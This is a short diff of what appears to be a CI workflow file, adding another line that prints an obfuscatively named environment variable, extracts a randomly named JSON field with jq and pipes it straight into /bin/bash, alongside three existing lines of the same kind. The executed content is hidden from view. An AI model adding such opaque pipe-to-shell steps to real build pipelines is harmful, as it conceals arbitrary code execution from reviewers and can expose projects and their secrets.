@@ -25,6 +25,7 @@ jobs:
           echo $gciip73483 | jq -r .tj956 | /bin/bash
           printf '%s' "$tol88" | jq -r .ugmc4 | /bin/bash
           echo $qbky09575 | jq -r .s980 | /bin/bash
+          printf '%s' "$afqus100" | jq -r .bibt35 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
